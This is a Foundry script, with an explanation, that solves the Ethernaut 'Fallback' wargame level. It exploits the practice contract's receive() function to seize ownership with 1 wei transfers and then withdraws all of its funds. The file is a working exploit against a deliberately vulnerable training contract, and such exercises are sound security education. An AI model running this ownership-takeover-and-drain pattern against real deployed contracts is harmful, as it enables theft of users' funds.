// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import the contract and Forge script utilities
import "../src/Fallback.sol";
import "../lib/forge-std/src/Script.sol";

contract FallbackSolution is Script {
    
    // Replace this with the actual instance address
    address fallbackInstanceAddress = 0xYourInstanceAddressHere;
    
    // Reference to the deployed Fallback contract instance
    Fallback public fallbackInstance = Fallback(payable(fallbackInstanceAddress));

    function run() external {
        // Start broadcasting transactions from the account associated with the PRIVATE_KEY
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Contribute 1 wei to the contract, fulfilling the first condition of becoming an owner
        fallbackInstance.contribute{value: 1 wei}();

        // Send 1 wei directly to the contract to trigger the fallback function
        // This changes ownership of the contract as the fallback function sets msg.sender as the new owner
        fallbackInstanceAddress.call{value: 1 wei}("");

        // Now that we are the owner, withdraw all the funds from the contract to complete the challenge
        fallbackInstance.withdraw();

        // Stop the broadcast after all transactions are executed
        vm.stopBroadcast();
    }
}

/* 
Explanation:

This script is the solution to the "Fallback" challenge in Ethernaut, where the goal is to become the owner of the contract and withdraw all its funds. 

1. **Contributing 1 wei**: The contract has a function `contribute()` that adds to the sender’s contributions. By contributing 1 wei, we meet the requirement to interact with the contract.
   
2. **Triggering the fallback function**: By sending 1 wei using a low-level call (`call{value: 1 wei}("")`), we trigger the contract's `receive()` fallback function, which transfers ownership of the contract to the caller (`msg.sender`). The fallback function assigns ownership when the sender has already contributed and sends ether directly.

3. **Withdrawing the funds**: Once we become the owner, we can call the `withdraw()` function, which is protected by the `onlyOwner` modifier. This allows us to withdraw all the ether in the contract.

The script needs to be run on the network after replacing the instance address. After successfully running the script, the challenge will be completed as we will have drained the contract.
*/